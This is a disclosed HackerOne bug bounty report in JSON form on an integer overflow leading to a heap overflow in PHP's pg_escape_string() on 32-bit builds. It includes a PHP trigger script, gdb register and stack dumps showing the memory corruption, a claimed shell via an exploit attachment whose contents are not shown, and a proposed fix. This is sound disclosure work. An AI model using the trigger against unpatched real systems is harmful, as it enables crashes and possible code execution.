{"id":180584,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA1ODQ=","url":"https://hackerone.com/reports/180584","title":"Heap overflow due to integer overflow in pg_escape_string() function","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-11-07T07:34:11.572Z","submitted_at":"2016-11-07T07:34:11.572Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fosec","url":"/fosec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:22:02.796Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:21:58.345Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The fix for this bug has been committed: https://bugs.php.net/bug.php?id=73399\nDescription:\n------------\nI have found some vulnerable code at `pg_escape_string()` function in module PostgreSQL. `pg_escape_string()` function creates a new zend_string object to store escaped string. The size of destination string depends on the size of source string. ( refer at `ext/pgsql/pgsql.c:4384` )\n\n``` c\nPHP_FUNCTION(pg_escape_string)\n{\n...\n    zend_string *from = NULL, *to = NULL;\n   \n....\n\tto = zend_string_alloc(ZSTR_LEN(from) * 2, 0);\n...\n}\n```\n\nIf length of `from` string is equal to PHP_INT_MAX, new string `to` will have an unexpected length. Due to missing check of size before calling\n`zend_string_alloc()`, this new memory range can not use to store large data and lead to heap overflow. I can overwrite other objects of PHP in memory. This bug is only triggered in 32bit machine.\n\nSolution:\nIt should be `zend_string_alloc_safe` instead of `zend_string_alloc`. \n\nTest script:\n---------------\n``` php\n\u003c?php\nini_set('memory_limit', -1);\n$s = str_repeat(\"a\",0x7FFFFFFF);\n$escaped = pg_escape_string($s);\n?\u003e\n```\nActual result:\n--------------\nOpen php program in gdb and run test script, set a breakpoint at line in file `ext/pgsql/pgsql.c:4384`.\nWhen debugger stops, we have the length of `from` string is 0x7fffffff. The size which is used as parameter in `_emalloc()` function is equal to `((0x7fffffff * 2 + 0x14 ) \u0026 0xfffffffc)`. Due to integer overflow, new size is 0x10. The new memory region is too small to store a large string! \n```\n [----------------------------------registers-----------------------------------]\nEAX: 0x36e00000 --\u003e 0x2 \nEBX: 0x8903068 --\u003e 0x1 \nECX: 0x10 \nEDX: 0xbfffc0d8 --\u003e 0x36e00000 --\u003e 0x2 \nESI: 0xb72130a0 --\u003e 0x0 \nEDI: 0xfffffffe \nEBP: 0x0 \nESP: 0xbfffc0b0 --\u003e 0x1 \nEIP: 0x81dfa4d (\u003czif_pg_escape_string+93\u003e:\tcall   0x8312c90 \u003c_emalloc\u003e)\nEFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x81dfa45 \u003czif_pg_escape_string+85\u003e:\tadd    edi,edi\n   0x81dfa47 \u003czif_pg_escape_string+87\u003e:\tlea    ecx,[edi+0x14]\n   0x81dfa4a \u003czif_pg_escape_string+90\u003e:\tand    ecx,0xfffffffc\n=\u003e 0x81dfa4d \u003czif_pg_escape_string+93\u003e:\tcall   0x8312c90 \u003c_emalloc\u003e\n   0x81dfa52 \u003czif_pg_escape_string+98\u003e:\ttest   ebp,ebp\n   0x81dfa54 \u003czif_pg_escape_string+100\u003e:\tmov    ebx,eax\n   0x81dfa56 \u003czif_pg_escape_string+102\u003e:\tmov    DWORD PTR [eax],0x1\n   0x81dfa5c \u003czif_pg_escape_string+108\u003e:\tmov    DWORD PTR [eax+0x4],0x6\nNo argument\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffc0b0 --\u003e 0x1 \n0004| 0xbfffc0b4 --\u003e 0x84a3ac9 --\u003e 0x69760053 ('a' \u003crepeats 200 times\u003e...)\n0008| 0xbfffc0b8 --\u003e 0xbfffc0d8 --\u003e 0x36e00000 --\u003e 0x2 \n0012| 0xbfffc0bc --\u003e 0xbfffc0dc --\u003e 0x7fffffff ('a' \u003crepeats 200 times\u003e...)\n0016| 0xbfffc0c0 --\u003e 0x89b2db0 --\u003e 0xb7d68450 --\u003e 0x89b3030 --\u003e 0x0 \n0020| 0xbfffc0c4 --\u003e 0x7fffffff ('a' \u003crepeats 200 times\u003e...)\n0024| 0xbfffc0c8 --\u003e 0x36e00000 --\u003e 0x2 \n0028| 0xbfffc0cc --\u003e 0xb725f3a8 --\u003e 0x1 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x081dfa4d\t122\t\tzend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);\ngdb-peda$ \n```\n\nif we continue running, other memory region will be overwritten until SIGSEGV!\n```\n[----------------------------------registers-----------------------------------]\nEAX: 0x61 ('a')\nEBX: 0xb7f8b000 --\u003e 0x2ae9c \nECX: 0x0 \nEDX: 0xb7400000 \nESI: 0x36f96fb1 ('a' \u003crepeats 200 times\u003e...)\nEDI: 0x7fe6905f ('a' \u003crepeats 200 times\u003e...)\nEBP: 0xb7400001 \nESP: 0xbfffc040 --\u003e 0xbfffc090 --\u003e 0x0 \nEIP: 0xb7f6d287 (\u003cPQescapeStringInternal+119\u003e:\tmov    BYTE PTR [edx],al)\nEFLAGS: 0x210206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xb7f6d27e \u003cPQescapeStringInternal+110\u003e:\tmov    BYTE PTR [ebp+0x0],al\n   0xb7f6d281 \u003cPQescapeStringInternal+113\u003e:\tlea    ebp,[edx+0x1]\n   0xb7f6d284 \u003cPQescapeStringInternal+116\u003e:\tadd    esi,0x1\n=\u003e 0xb7f6d287 \u003cPQescapeStringInternal+119\u003e:\tmov    BYTE PTR [edx],al\n   0xb7f6d289 \u003cPQescapeStringInternal+121\u003e:\tsub    edi,0x1\n   0xb7f6d28c \u003cPQescapeStringInternal+124\u003e:\ttest   edi,edi\n   0xb7f6d28e \u003cPQescapeStringInternal+126\u003e:\tje     0xb7f6d297 \u003cPQescapeStringInternal+135\u003e\n   0xb7f6d290 \u003cPQescapeStringInternal+128\u003e:\tmovzx  eax,BYTE PTR [esi]\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffc040 --\u003e 0xbfffc090 --\u003e 0x0 \n0004| 0xbfffc044 --\u003e 0xb7fed6cd (\u003c_dl_fixup+205\u003e:\tsub    esp,0x14)\n0008| 0xbfffc048 --\u003e 0xb7fffab0 --\u003e 0xb7fffa54 --\u003e 0xb754496c --\u003e 0xb7fff8f8 --\u003e 0x0 \n0012| 0xbfffc04c --\u003e 0x0 \n0016| 0xbfffc050 --\u003e 0x1 \n0020| 0xbfffc054 --\u003e 0x0 \n0024| 0xbfffc058 --\u003e 0xb7269060 ('a' \u003crepeats 200 times\u003e...)\n0028| 0xbfffc05c --\u003e 0x0 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0xb7f6d287 in PQescapeStringInternal () from /lib/libpq.so.5\ngdb-peda$ \n```\nI can leak memory to bypass ASLR + DEP and control eip register to the arbitrary value. Finally, the overflow results as arbitrary code execution. I use PHP-7.1 (at https://github.com/php/php-src, commit 931ea5c872a0a4455c5bbb8470c7a1d049bd8501), run the attachment at local machine and get `/bin/sh`","vulnerability_information_html":"\u003cp\u003eThe fix for this bug has been committed: \u003ca title=\"https://bugs.php.net/bug.php?id=73399\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D73399\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=73399\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription:\u003c/h2\u003e\n\n\u003cp\u003eI have found some vulnerable code at \u003ccode\u003epg_escape_string()\u003c/code\u003e function in module PostgreSQL. \u003ccode\u003epg_escape_string()\u003c/code\u003e function creates a new zend_string object to store escaped string. The size of destination string depends on the size of source string. ( refer at \u003ccode\u003eext/pgsql/pgsql.c:4384\u003c/code\u003e )\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003ePHP_FUNCTION\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epg_escape_string\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ezend_string\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003efrom\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eto\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e....\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eto\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_string_alloc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eZSTR_LEN\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efrom\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf length of \u003ccode\u003efrom\u003c/code\u003e string is equal to PHP_INT_MAX, new string \u003ccode\u003eto\u003c/code\u003e will have an unexpected length. Due to missing check of size before calling\u003cbr\u003e\n\u003ccode\u003ezend_string_alloc()\u003c/code\u003e, this new memory range can not use to store large data and lead to heap overflow. I can overwrite other objects of PHP in memory. This bug is only triggered in 32bit machine.\u003c/p\u003e\n\n\u003cp\u003eSolution:\u003cbr\u003e\nIt should be \u003ccode\u003ezend_string_alloc_safe\u003c/code\u003e instead of \u003ccode\u003ezend_string_alloc\u003c/code\u003e. \u003c/p\u003e\n\n\u003ch2 id=\"test-script\"\u003eTest script:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eini_set\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;memory_limit\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;a\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x7FFFFFFF\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$escaped\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003epg_escape_string\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"actual-result\"\u003eActual result:\u003c/h2\u003e\n\n\u003cp\u003eOpen php program in gdb and run test script, set a breakpoint at line in file \u003ccode\u003eext/pgsql/pgsql.c:4384\u003c/code\u003e.\u003cbr\u003e\nWhen debugger stops, we have the length of \u003ccode\u003efrom\u003c/code\u003e string is 0x7fffffff. The size which is used as parameter in \u003ccode\u003e_emalloc()\u003c/code\u003e function is equal to \u003ccode\u003e((0x7fffffff * 2 + 0x14 ) \u0026amp; 0xfffffffc)\u003c/code\u003e. Due to integer overflow, new size is 0x10. The new memory region is too small to store a large string! \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e [----------------------------------registers-----------------------------------]\nEAX: 0x36e00000 --\u0026gt; 0x2 \nEBX: 0x8903068 --\u0026gt; 0x1 \nECX: 0x10 \nEDX: 0xbfffc0d8 --\u0026gt; 0x36e00000 --\u0026gt; 0x2 \nESI: 0xb72130a0 --\u0026gt; 0x0 \nEDI: 0xfffffffe \nEBP: 0x0 \nESP: 0xbfffc0b0 --\u0026gt; 0x1 \nEIP: 0x81dfa4d (\u0026lt;zif_pg_escape_string+93\u0026gt;:  call   0x8312c90 \u0026lt;_emalloc\u0026gt;)\nEFLAGS: 0x200202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x81dfa45 \u0026lt;zif_pg_escape_string+85\u0026gt;: add    edi,edi\n   0x81dfa47 \u0026lt;zif_pg_escape_string+87\u0026gt;: lea    ecx,[edi+0x14]\n   0x81dfa4a \u0026lt;zif_pg_escape_string+90\u0026gt;: and    ecx,0xfffffffc\n=\u0026gt; 0x81dfa4d \u0026lt;zif_pg_escape_string+93\u0026gt;: call   0x8312c90 \u0026lt;_emalloc\u0026gt;\n   0x81dfa52 \u0026lt;zif_pg_escape_string+98\u0026gt;: test   ebp,ebp\n   0x81dfa54 \u0026lt;zif_pg_escape_string+100\u0026gt;:    mov    ebx,eax\n   0x81dfa56 \u0026lt;zif_pg_escape_string+102\u0026gt;:    mov    DWORD PTR [eax],0x1\n   0x81dfa5c \u0026lt;zif_pg_escape_string+108\u0026gt;:    mov    DWORD PTR [eax+0x4],0x6\nNo argument\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffc0b0 --\u0026gt; 0x1 \n0004| 0xbfffc0b4 --\u0026gt; 0x84a3ac9 --\u0026gt; 0x69760053 (\u0026#39;a\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0008| 0xbfffc0b8 --\u0026gt; 0xbfffc0d8 --\u0026gt; 0x36e00000 --\u0026gt; 0x2 \n0012| 0xbfffc0bc --\u0026gt; 0xbfffc0dc --\u0026gt; 0x7fffffff (\u0026#39;a\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0016| 0xbfffc0c0 --\u0026gt; 0x89b2db0 --\u0026gt; 0xb7d68450 --\u0026gt; 0x89b3030 --\u0026gt; 0x0 \n0020| 0xbfffc0c4 --\u0026gt; 0x7fffffff (\u0026#39;a\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0024| 0xbfffc0c8 --\u0026gt; 0x36e00000 --\u0026gt; 0x2 \n0028| 0xbfffc0cc --\u0026gt; 0xb725f3a8 --\u0026gt; 0x1 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x081dfa4d  122     zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent);\ngdb-peda$ \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eif we continue running, other memory region will be overwritten until SIGSEGV!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[----------------------------------registers-----------------------------------]\nEAX: 0x61 (\u0026#39;a\u0026#39;)\nEBX: 0xb7f8b000 --\u0026gt; 0x2ae9c \nECX: 0x0 \nEDX: 0xb7400000 \nESI: 0x36f96fb1 (\u0026#39;a\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEDI: 0x7fe6905f (\u0026#39;a\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEBP: 0xb7400001 \nESP: 0xbfffc040 --\u0026gt; 0xbfffc090 --\u0026gt; 0x0 \nEIP: 0xb7f6d287 (\u0026lt;PQescapeStringInternal+119\u0026gt;:  mov    BYTE PTR [edx],al)\nEFLAGS: 0x210206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xb7f6d27e \u0026lt;PQescapeStringInternal+110\u0026gt;: mov    BYTE PTR [ebp+0x0],al\n   0xb7f6d281 \u0026lt;PQescapeStringInternal+113\u0026gt;: lea    ebp,[edx+0x1]\n   0xb7f6d284 \u0026lt;PQescapeStringInternal+116\u0026gt;: add    esi,0x1\n=\u0026gt; 0xb7f6d287 \u0026lt;PQescapeStringInternal+119\u0026gt;: mov    BYTE PTR [edx],al\n   0xb7f6d289 \u0026lt;PQescapeStringInternal+121\u0026gt;: sub    edi,0x1\n   0xb7f6d28c \u0026lt;PQescapeStringInternal+124\u0026gt;: test   edi,edi\n   0xb7f6d28e \u0026lt;PQescapeStringInternal+126\u0026gt;: je     0xb7f6d297 \u0026lt;PQescapeStringInternal+135\u0026gt;\n   0xb7f6d290 \u0026lt;PQescapeStringInternal+128\u0026gt;: movzx  eax,BYTE PTR [esi]\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffc040 --\u0026gt; 0xbfffc090 --\u0026gt; 0x0 \n0004| 0xbfffc044 --\u0026gt; 0xb7fed6cd (\u0026lt;_dl_fixup+205\u0026gt;:   sub    esp,0x14)\n0008| 0xbfffc048 --\u0026gt; 0xb7fffab0 --\u0026gt; 0xb7fffa54 --\u0026gt; 0xb754496c --\u0026gt; 0xb7fff8f8 --\u0026gt; 0x0 \n0012| 0xbfffc04c --\u0026gt; 0x0 \n0016| 0xbfffc050 --\u0026gt; 0x1 \n0020| 0xbfffc054 --\u0026gt; 0x0 \n0024| 0xbfffc058 --\u0026gt; 0xb7269060 (\u0026#39;a\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0028| 0xbfffc05c --\u0026gt; 0x0 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0xb7f6d287 in PQescapeStringInternal () from /lib/libpq.so.5\ngdb-peda$ \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI can leak memory to bypass ASLR + DEP and control eip register to the arbitrary value. Finally, the overflow results as arbitrary code execution. I use PHP-7.1 (at \u003ca title=\"https://github.com/php/php-src\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/php/php-src\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, commit 931ea5c872a0a4455c5bbb8470c7a1d049bd8501), run the attachment at local machine and get \u003ccode\u003e/bin/sh\u003c/code\u003e\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":133282,"file_name":"pg_escape_string_exploit.php","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/133/282/2f70d7446c18cbf8c1ff3eeb7e00e27c1764005c/pg_escape_string_exploit.php?response-content-disposition=attachment%3B%20filename%3D%22pg_escape_string_exploit.php%22%3B%20filename%2A%3DUTF-8%27%27pg_escape_string_exploit.php\u0026response-content-type=text%2Fx-php\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVBWWKZ4H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044509Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCmEbZvVQ%2FI1GHRJjrhZK2Y6zh4lCWK725%2FwOpNu%2BnZkAIhAIZlqGHog%2B4PZMdnvhSU5APZbycPDz1wpNXbi5uE94ueKrQDCFUQARoMMDEzNjE5Mjc0ODQ5IgxU5AAHhqo1cPAzbTcqkQOGB5pEHXl6QCBCTSHUmyd%2FF8M3rpTqzp%2BOigrWU%2BrXYHZYm%2BGDawsiXhnqeD9o8Qw0b%2Fr0efVbRmhj5baoPrxgSiY%2B9zsreR3qClZZKnS0%2Brs8OqiMGd3clBbyfOxw2fa2vgQglV4dLF6EXSiGfxOms8eWdw%2F8mPtc81dMxDIlxTs50KUnd6aUjgG5BJs2k%2FL0rOKXYBS%2FdVqIQdN8JcCKMvqDv0u7pvSGEecQXa7pGdf07ufO02E64eU0OnaTeNyoq7WlZzT%2FGyvHjVtIvbXdPW15pwZm2Q4u8%2FW7ksSv4%2BxsESWLLCop0OeGUhtIppCDQlaMPC9JTj0HYKbMEGmZagmLfgHX4DKRg75%2FLNQViGcE%2FRCCaMxd6wrsv0dlz4dekjWvp4mXzLFkuKBM6c%2F%2BAemkmkgOJKnp%2FJUV1zJTe%2BO14GyIigsvxJqvrnKvkmsUrYwar1bX%2Be7UkqGzVbMAlsbRDNIOok7bVRXerhpXnbqFQsLWlqe%2BNfa4gSSfmgu4iIjCRRMdTWsvy2NQHfTsGjDAzar%2FBTrqAcniMm3eG7%2BxDZb9XVqMyQiSNyiuBD8pwO78bO8T3Uu8vSI3S05C6UCutmNkOnjR9D2NZaOgbFO4YujbW%2FY0mhhdjSppvg%2Bzdgu0AfZOou0DDwqm4vwEc0ekiNYUD6KHvD5tZwOaalihV5dSfbzoDyvfsJI6x7RYpBZmwPcshKw3Csz0uZew1JqrbUJVmc9v6q0aXols8bxyDKKPfp6siyzKhHELgTS3XGskds%2BWx5FaWemc%2Bo8QqyIuoOtWjmUwF39ydFOfg%2FyeKdwBxELGLKCSN8MyV6ov7IBrib4UiM%2F6l36ymDoHIX8ohg%3D%3D\u0026X-Amz-Signature=1bf65eba35c7e2f8fa5da9137a2dfd9fdd4205f6f70b76331815c8f7891fa11a","file_size":13049,"type":"text/x-php"}],"allow_singular_disclosure_at":"2019-11-12T09:21:58.536Z","allow_singular_disclosure_after":-35666591.03569368,"singular_disclosure_allowed":true,"vote_count":1,"voters":["spetr0x"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1339046,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:46:59.625Z","updated_at":"2016-12-03T20:46:59.625Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":11363},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339047,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:47:05.353Z","updated_at":"2016-12-03T20:47:05.353Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"fosec","url":"/fosec"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339048,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:47:11.869Z","updated_at":"2016-12-03T20:47:11.869Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"fosec","url":"/fosec"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6025959,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:21:58.481Z","updated_at":"2019-10-13T09:21:58.481Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285702,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:22:02.812Z","updated_at":"2019-11-12T09:22:02.812Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}